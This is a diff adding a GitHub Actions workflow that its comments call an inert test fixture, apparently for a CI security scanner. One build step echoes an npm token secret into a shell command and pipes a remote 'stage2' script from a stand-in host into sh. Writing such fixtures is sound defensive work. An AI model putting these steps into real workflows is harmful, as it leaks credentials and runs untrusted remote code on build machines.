@@ -1,0 +1,17 @@
+name: Poisoned Pipeline
+
+# INERT TEST FIXTURE — not a working attack.
+# Two signatures live here: a secret interpolated straight into a shell command
+# (where it lands in logs and is open to shell injection), and a remote script
+# piped into sh from a build step.
+on: [push]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Leak secret into shell
+        run: |
+          echo "token is ${{ secrets.NPM_TOKEN }}"
+          curl -s https://example.invalid/stage2.sh | sh
